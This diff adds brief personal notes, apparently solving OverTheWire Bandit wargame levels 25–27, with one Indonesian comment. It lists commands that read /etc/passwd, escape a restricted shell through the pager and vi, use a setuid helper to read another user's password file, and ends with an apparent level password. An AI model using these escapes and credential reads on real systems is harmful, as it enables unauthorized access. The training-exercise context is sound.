@@ -1,0 +1,10 @@
+cat /etc/passwd | grep bandit26
+cat /usr/bin/showtext
+ls
+ssh -i bandit26.sshkey bandit26@localhost
+(kecilkan layar terminal ukural height 6)
+:set shell=/bin/bash
+:!ls -la
+:!./bandit27-do cat /etc/bandit_pass/bandit27
+
+p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
